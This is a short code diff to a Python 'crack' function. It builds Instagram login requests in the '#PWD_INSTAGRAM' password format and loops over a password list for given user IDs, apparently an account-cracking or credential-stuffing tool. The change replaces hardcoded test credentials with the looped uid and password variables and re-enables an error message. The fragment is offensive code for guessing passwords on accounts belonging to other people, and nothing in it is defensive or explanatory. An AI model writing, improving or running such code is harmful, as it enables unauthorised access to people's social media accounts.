@@ -159,8 +159,8 @@ def crack(uid, password_list, total_count):
             timestamp = int(time.time())
         
             # URL encode username and password
-            encoded_username = urllib.parse.quote('6297352149')
-            encoded_password = urllib.parse.quote('62973521')
+            encoded_username = urllib.parse.quote(uid)
+            encoded_password = urllib.parse.quote(pw)
         
             # Generate encrypted password format
             encrypted_password = f'#PWD_INSTAGRAM:0:{timestamp}:{encoded_password}'
@@ -263,7 +263,7 @@ def crack(uid, password_list, total_count):
                    cps.append(uid)
                    continue
             else:
-                #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
+                print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
         loop += 1
     except requests.exceptions.Timeout:
